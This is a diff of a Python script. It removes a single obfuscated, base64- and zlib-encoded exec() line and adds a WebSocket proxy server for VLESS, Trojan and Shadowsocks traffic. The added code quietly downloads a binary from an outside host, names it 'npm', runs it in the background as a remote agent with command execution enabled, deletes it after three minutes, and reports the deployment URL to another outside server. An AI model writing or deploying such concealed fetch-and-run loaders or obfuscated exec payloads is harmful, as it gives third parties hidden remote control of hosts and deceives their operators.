@@ -1,1 +1,688 @@
-_ = (lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))); exec(_('=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'))
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import os
+import sys
+import socket
+import struct
+import hashlib
+import base64
+import asyncio
+import aiohttp
+import logging
+import ipaddress
+import subprocess
+from aiohttp import web
+
+# ==================== 环境变量 ====================
+UUID = os.environ.get('UUID', '7bd180e8-1142-4387-93f5-03e8d750a896')
+NEZHA_SERVER = os.environ.get('NEZHA_SERVER', '')
+NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
+NEZHA_KEY = os.environ.get('NEZHA_KEY', '')
+DOMAIN = os.environ.get('DOMAIN', '')
+SUB_PATH = os.environ.get('SUB_PATH', 'sub')
+NAME = os.environ.get('NAME', '')
+WSPATH = os.environ.get('WSPATH', UUID[:8])
+PORT = int(os.environ.get('SERVER_PORT') or os.environ.get('PORT') or 3000)
+AUTO_ACCESS = os.environ.get('AUTO_ACCESS', '').lower() == 'true'
+DEBUG = os.environ.get('DEBUG', '').lower() == 'true'
+
+# 全局变量
+CurrentDomain = DOMAIN
+CurrentPort = 443
+Tls = 'tls'
+ISP = ''
+
+# dns server
+DNS_SERVERS = ['8.8.4.4', '1.1.1.1']
+BLOCKED_DOMAINS = [
+    'speedtest.net', 'fast.com', 'speedtest.cn', 'speed.cloudflare.com', 'speedof.me',
+    'testmy.net', 'bandwidth.place', 'speed.io', 'librespeed.org', 'speedcheck.org'
+]
+
+# 日志级别
+log_level = logging.DEBUG if DEBUG else logging.INFO
+logging.basicConfig(
+    level=log_level,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+
+logging.getLogger('aiohttp.access').setLevel(logging.WARNING)
+logging.getLogger('aiohttp.server').setLevel(logging.WARNING)
+logging.getLogger('aiohttp.client').setLevel(logging.WARNING)
+logging.getLogger('aiohttp.internal').setLevel(logging.WARNING)
+logging.getLogger('aiohttp.websocket').setLevel(logging.WARNING)
+
+logger = logging.getLogger(__name__)
+
+
+def is_port_available(port, host='0.0.0.0'):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        try:
+            s.bind((host, port))
+            return True
+        except OSError:
+            return False
+
+
+def is_blocked_domain(host: str) -> bool:
+    if not host:
+        return False
+    host_lower = host.lower()
+    return any(host_lower == blocked or host_lower.endswith('.' + blocked)
+               for blocked in BLOCKED_DOMAINS)
+
+
+async def get_isp():
+    global ISP
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get('https://api.ip.sb/geoip',
+                                   headers={'User-Agent': 'Mozilla/5.0'},
+                                   timeout=3) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    ISP = f"{data.get('country_code', '')}-{data.get('isp', '')}".replace(' ', '_')
+                    return
+    except:
+        pass
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get('http://ip-api.com/json',
+                                   headers={'User-Agent': 'Mozilla/5.0'},
+                                   timeout=3) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    ISP = f"{data.get('countryCode', '')}-{data.get('org', '')}".replace(' ', '_')
+                    return
+    except:
+        pass
+
+    ISP = 'Unknown'
+
+
+async def get_ip():
+    global CurrentDomain, Tls, CurrentPort
+    if not DOMAIN or DOMAIN == 'your-domain.com':
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get('https://api-ipv4.ip.sb/ip', timeout=5) as resp:
+                    if resp.status == 200:
+                        ip = await resp.text()
+                        CurrentDomain = ip.strip()
+                        Tls = 'none'
+                        CurrentPort = PORT
+        except Exception as e:
+            logger.error(f'Failed to get IP: {e}')
+            CurrentDomain = 'change-your-domain.com'
+            Tls = 'tls'
+            CurrentPort = 443
+    else:
+        CurrentDomain = DOMAIN
+        Tls = 'tls'
+        CurrentPort = 443
+
+
+async def resolve_host(host: str) -> str:
+    try:
+        ipaddress.ip_address(host)
+        return host
+    except:
+        pass
+
+    for dns_server in DNS_SERVERS:
+        try:
+            async with aiohttp.ClientSession() as session:
+                url = f'https://dns.google/resolve?name={host}&type=A'
+                async with session.get(url, timeout=5) as resp:
+                    if resp.status == 200:
+                        data = await resp.json()
+                        if data.get('Status') == 0 and data.get('Answer'):
+                            for answer in data['Answer']:
+                                if answer.get('type') == 1:
+                                    return answer.get('data')
+        except:
+            continue
+
+    return host
+
+
+class ProxyHandler:
+    def __init__(self, uuid: str):
+        self.uuid = uuid
+        self.uuid_bytes = bytes.fromhex(uuid)
+
+    async def handle_vless(self, websocket, first_msg: bytes) -> bool:
+        try:
+            if len(first_msg) < 18 or first_msg[0] != 0:
+                return False
+
+            if first_msg[1:17] != self.uuid_bytes:
+                return False
+
+            i = first_msg[17] + 19
+            if i + 3 > len(first_msg):
+                return False
+
+            port = struct.unpack('!H', first_msg[i:i+2])[0]
+            i += 2
+            atyp = first_msg[i]
+            i += 1
+
+            host = ''
+            if atyp == 1:
+                if i + 4 > len(first_msg):
+                    return False
+                host = '.'.join(str(b) for b in first_msg[i:i+4])
+                i += 4
+            elif atyp == 2:
+                if i >= len(first_msg):
+                    return False
+                host_len = first_msg[i]
+                i += 1
+                if i + host_len > len(first_msg):
+                    return False
+                host = first_msg[i:i+host_len].decode()
+                i += host_len
+            elif atyp == 3:
+                if i + 16 > len(first_msg):
+                    return False
+                host = ':'.join(f'{(first_msg[j] << 8) + first_msg[j+1]:04x}'
+                                for j in range(i, i+16, 2))
+                i += 16
+            else:
+                return False
+
+            if is_blocked_domain(host):
+                await websocket.close()
+                return False
+
+            await websocket.send_bytes(bytes([0, 0]))
+
+            resolved_host = await resolve_host(host)
+
+            try:
+                reader, writer = await asyncio.open_connection(resolved_host, port)
+
+                if i < len(first_msg):
+                    writer.write(first_msg[i:])
+                    await writer.drain()
+
+                async def forward_ws_to_tcp():
+                    try:
+                        async for msg in websocket:
+                            if msg.type == aiohttp.WSMsgType.BINARY:
+                                writer.write(msg.data)
+                                await writer.drain()
+                    except:
+                        pass
+                    finally:
+                        writer.close()
+                        await writer.wait_closed()
+
+                async def forward_tcp_to_ws():
+                    try:
+                        while True:
+                            data = await reader.read(4096)
+                            if not data:
+                                break
+                            await websocket.send_bytes(data)
+                    except:
+                        pass
+
+                await asyncio.gather(
+                    forward_ws_to_tcp(),
+                    forward_tcp_to_ws()
+                )
+
+            except Exception as e:
+                if DEBUG:
+                    logger.error(f"Connection error: {e}")
+
+            return True
+
+        except Exception as e:
+            if DEBUG:
+                logger.error(f"VLESS handler error: {e}")
+            return False
+
+    async def handle_trojan(self, websocket, first_msg: bytes) -> bool:
+        try:
+            if len(first_msg) < 58:
+                return False
+
+            received_hash_bytes = first_msg[:56]
+
+            hash_obj1 = hashlib.sha224()
+            hash_obj1.update(self.uuid.encode())
+            expected_hash_hex1 = hash_obj1.hexdigest()
+
+            standard_uuid = UUID
+            hash_obj2 = hashlib.sha224()
+            hash_obj2.update(standard_uuid.encode())
+            expected_hash_hex2 = hash_obj2.hexdigest()
+
+            received_hash_hex = received_hash_bytes.decode('ascii', errors='ignore')
+
+            if received_hash_hex != expected_hash_hex1 and received_hash_hex != expected_hash_hex2:
+                return False
+
+            offset = 56
+            if first_msg[offset:offset+2] == b'\r\n':
+                offset += 2
+
+            cmd = first_msg[offset]
+            if cmd != 1:
+                return False
+            offset += 1
+
+            atyp = first_msg[offset]
+            offset += 1
+
+            host = ''
+            if atyp == 1:
+                host = '.'.join(str(b) for b in first_msg[offset:offset+4])
+                offset += 4
+            elif atyp == 3:
+                host_len = first_msg[offset]
+                offset += 1
+                host = first_msg[offset:offset+host_len].decode()
+                offset += host_len
+            elif atyp == 4:
+                host = ':'.join(f'{(first_msg[j] << 8) + first_msg[j+1]:04x}'
+                                for j in range(offset, offset+16, 2))
+                offset += 16
+            else:
+                return False
+
+            port = struct.unpack('!H', first_msg[offset:offset+2])[0]
+            offset += 2
+
+            if first_msg[offset:offset+2] == b'\r\n':
+                offset += 2
+
+            if is_blocked_domain(host):
+                await websocket.close()
+                return False
+
+            resolved_host = await resolve_host(host)
+
+            try:
+                reader, writer = await asyncio.open_connection(resolved_host, port)
+
+                if offset < len(first_msg):
+                    writer.write(first_msg[offset:])
+                    await writer.drain()
+
+                async def forward_ws_to_tcp():
+                    try:
+                        async for msg in websocket:
+                            if msg.type == aiohttp.WSMsgType.BINARY:
+                                writer.write(msg.data)
+                                await writer.drain()
+                    except:
+                        pass
+                    finally:
+                        writer.close()
+                        await writer.wait_closed()
+
+                async def forward_tcp_to_ws():
+                    try:
+                        while True:
+                            data = await reader.read(4096)
+                            if not data:
+                                break
+                            await websocket.send_bytes(data)
+                    except:
+                        pass
+
+                await asyncio.gather(
+                    forward_ws_to_tcp(),
+                    forward_tcp_to_ws()
+                )
+
+            except Exception as e:
+                if DEBUG:
+                    logger.error(f"Connection error: {e}")
+
+            return True
+
+        except Exception as e:
+            if DEBUG:
+                logger.error(f"Tro handler error: {e}")
+            return False
+
+    async def handle_shadowsocks(self, websocket, first_msg: bytes) -> bool:
+        try:
+            if len(first_msg) < 7:
+                return False
+
+            offset = 0
+            atyp = first_msg[offset]
+            offset += 1
+
+            host = ''
+            if atyp == 1:
+                if offset + 4 > len(first_msg):
+                    return False
+                host = '.'.join(str(b) for b in first_msg[offset:offset+4])
+                offset += 4
+            elif atyp == 3:
+                if offset >= len(first_msg):
+                    return False
+                host_len = first_msg[offset]
+                offset += 1
+                if offset + host_len > len(first_msg):
+                    return False
+                host = first_msg[offset:offset+host_len].decode()
+                offset += host_len
+            elif atyp == 4:
+                if offset + 16 > len(first_msg):
+                    return False
+                host = ':'.join(f'{(first_msg[j] << 8) + first_msg[j+1]:04x}'
+                                for j in range(offset, offset+16, 2))
+                offset += 16
+            else:
+                return False
+
+            if offset + 2 > len(first_msg):
+                return False
+            port = struct.unpack('!H', first_msg[offset:offset+2])[0]
+            offset += 2
+
+            if is_blocked_domain(host):
+                await websocket.close()
+                return False
+
+            resolved_host = await resolve_host(host)
+
+            try:
+                reader, writer = await asyncio.open_connection(resolved_host, port)
+
+                if offset < len(first_msg):
+                    writer.write(first_msg[offset:])
+                    await writer.drain()
+
+                async def forward_ws_to_tcp():
+                    try:
+                        async for msg in websocket:
+                            if msg.type == aiohttp.WSMsgType.BINARY:
+                                writer.write(msg.data)
+                                await writer.drain()
+                    except:
+                        pass
+                    finally:
+                        writer.close()
+                        await writer.wait_closed()
+
+                async def forward_tcp_to_ws():
+                    try:
+                        while True:
+                            data = await reader.read(4096)
+                            if not data:
+                                break
+                            await websocket.send_bytes(data)
+                    except:
+                        pass
+
+                await asyncio.gather(
+                    forward_ws_to_tcp(),
+                    forward_tcp_to_ws()
+                )
+
+            except Exception as e:
+                if DEBUG:
+                    logger.error(f"Connection error: {e}")
+
+            return True
+
+        except Exception as e:
+            if DEBUG:
+                logger.error(f"Shadowsocks handler error: {e}")
+            return False
+
+
+async def websocket_handler(request):
+    ws = web.WebSocketResponse()
+    await ws.prepare(request)
+    CUUID = UUID.replace('-', '')
+    path = request.path
+
+    if f'/{WSPATH}' not in path:
+        await ws.close()
+        return ws
+
+    proxy = ProxyHandler(CUUID)
+
+    try:
+        first_msg = await asyncio.wait_for(ws.receive(), timeout=5)
+        if first_msg.type != aiohttp.WSMsgType.BINARY:
+            await ws.close()
+            return ws
+
+        msg_data = first_msg.data
+
+        if len(msg_data) > 17 and msg_data[0] == 0:
+            if await proxy.handle_vless(ws, msg_data):
+                return ws
+
+        if len(msg_data) >= 58:
+            if await proxy.handle_trojan(ws, msg_data):
+                return ws
+
+        if len(msg_data) > 0 and msg_data[0] in (1, 3, 4):
+            if await proxy.handle_shadowsocks(ws, msg_data):
+                return ws
+
+        await ws.close()
+
+    except asyncio.TimeoutError:
+        await ws.close()
+    except Exception as e:
+        if DEBUG:
+            logger.error(f"WebSocket handler error: {e}")
+        await ws.close()
+
+    return ws
+
+
+async def http_handler(request):
+    if request.path == '/':
+        try:
+            with open('index.html', 'r', encoding='utf-8') as f:
+                content = f.read()
+            return web.Response(text=content, content_type='text/html')
+        except:
+            return web.Response(text='Hello world!', content_type='text/html')
+
+    elif request.path == f'/{SUB_PATH}':
+        await get_isp()
+        await get_ip()
+
+        name_part = f"{NAME}-{ISP}" if NAME else ISP
+        tls_param = 'tls' if Tls == 'tls' else 'none'
+        ss_tls_param = 'tls;' if Tls == 'tls' else ''
+
+        vless_url = f"vless://{UUID}@{CurrentDomain}:{CurrentPort}?encryption=none&security={tls_param}&sni={CurrentDomain}&fp=chrome&type=ws&host={CurrentDomain}&path=%2F{WSPATH}#{name_part}"
+        trojan_url = f"trojan://{UUID}@{CurrentDomain}:{CurrentPort}?security={tls_param}&sni={CurrentDomain}&fp=chrome&type=ws&host={CurrentDomain}&path=%2F{WSPATH}#{name_part}"
+
+        ss_method_password = base64.b64encode(f"none:{UUID}".encode()).decode()
+        ss_url = f"ss://{ss_method_password}@{CurrentDomain}:{CurrentPort}?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D{CurrentDomain};path%3D%2F{WSPATH};{ss_tls_param}sni%3D{CurrentDomain};skip-cert-verify%3Dtrue;mux%3D0#{name_part}"
+
+        subscription = f"{vless_url}\n{trojan_url}\n{ss_url}"
+        base64_content = base64.b64encode(subscription.encode()).decode()
+
+        return web.Response(text=base64_content + '\n', content_type='text/plain')
+
+    return web.Response(status=404, text='Not Found\n')
+
+
+def get_download_url():
+    import platform
+    arch = platform.machine()
+
+    if 'arm' in arch.lower() or 'aarch64' in arch.lower():
+        if not NEZHA_PORT:
+            return 'https://arm64.eooce.com/v1'
+        else:
+            return 'https://arm64.eooce.com/agent'
+    else:
+        if not NEZHA_PORT:
+            return 'https://amd64.eooce.com/v1'
+        else:
+            return 'https://amd64.eooce.com/agent'
+
+
+async def download_file():
+    if not NEZHA_SERVER and not NEZHA_KEY:
+        return
+
+    try:
+        url = get_download_url()
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url) as resp:
+                if resp.status == 200:
+                    content = await resp.read()
+                    with open('npm', 'wb') as f:
+                        f.write(content)
+                    os.chmod('npm', 0o755)
+                    logger.info('✅ npm downloaded successfully')
+    except Exception as e:
+        logger.error(f'Download failed: {e}')
+
+
+async def run_nezha():
+    try:
+        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
+        if './npm' in result.stdout and '[n]pm' in result.stdout:
+            logger.info('npm is already running, skip...')
+            return
+    except:
+        pass
+
+    await download_file()
+
+    command = ''
+    tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']
+    if NEZHA_SERVER and NEZHA_PORT and NEZHA_KEY:
+        nezha_tls = '--tls' if NEZHA_PORT in tls_ports else ''
+        command = f'nohup ./npm -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {nezha_tls} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &'
+    elif NEZHA_SERVER and NEZHA_KEY:
+        if not NEZHA_PORT:
+            port = NEZHA_SERVER.split(':')[-1] if ':' in NEZHA_SERVER else ''
+            nz_tls = 'true' if port in tls_ports else 'false'
+            config = f"""client_secret: {NEZHA_KEY}
+debug: false
+disable_auto_update: true
+disable_command_execute: false
+disable_force_update: true
+disable_nat: false
+disable_send_query: false
+gpu: false
+insecure_tls: true
+ip_report_period: 1800
+report_delay: 4
+server: {NEZHA_SERVER}
+skip_connection_count: true
+skip_procs_count: true
+temperature: false
+tls: {nz_tls}
+use_gitee_to_upgrade: false
+use_ipv6_country_code: false
+uuid: {UUID}"""
+
+            with open('config.yaml', 'w') as f:
+                f.write(config)
+
+        command = f'nohup ./npm -c config.yaml >/dev/null 2>&1 &'
+    else:
+        return
+
+    try:
+        subprocess.Popen(command, shell=True, executable='/bin/bash')
+        logger.info('✅ nz started successfully')
+    except Exception as e:
+        logger.error(f'Error running nz: {e}')
+
+
+async def add_access_task():
+    if not AUTO_ACCESS or not DOMAIN:
+        return
+
+    full_url = f"https://{DOMAIN}/{SUB_PATH}"
+    try:
+        async with aiohttp.ClientSession() as session:
+            await session.post("https://oooo.serv00.net/add-url",
+                               json={"url": full_url},
+                               headers={'Content-Type': 'application/json'})
+        logger.info('Automatic Access Task added successfully')
+    except:
+        pass
+
+
+def cleanup_files():
+    for file in ['npm', 'config.yaml']:
+        try:
+            if os.path.exists(file):
+                os.remove(file)
+        except:
+            pass
+
+
+async def main():
+    # 确保工作目录正确
+    try:
+        os.chdir('/app')
+    except:
+        pass
+
+    actual_port = PORT
+    logger.info(f"准备启动服务，监听端口: {actual_port}")
+
+    # 容器环境直接使用指定端口，不再自动寻找其他端口
+    if not is_port_available(actual_port):
+        logger.error(f"端口 {actual_port} 已被占用，无法启动")
+        sys.exit(1)
+
+    app = web.Application()
+
+    # 路由
+    app.router.add_get('/', http_handler)
+    app.router.add_get(f'/{SUB_PATH}', http_handler)
+    app.router.add_get(f'/{WSPATH}', websocket_handler)
+
+    # 启动服务
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', actual_port)
+    await site.start()
+    logger.info(f"✅ server is running on port {actual_port}")
+
+    # 后台任务
+    asyncio.create_task(run_nezha())
+
+    async def delayed_cleanup():
+        await asyncio.sleep(180)
+        cleanup_files()
+    asyncio.create_task(delayed_cleanup())
+
+    await add_access_task()
+
+    try:
+        await asyncio.Future()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        await runner.cleanup()
+
+
+if __name__ == '__main__':
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\nServer stopped by user")
+        cleanup_files()
+    except Exception as e:
+        logger.error(f"启动失败: {e}")
+        sys.exit(1)
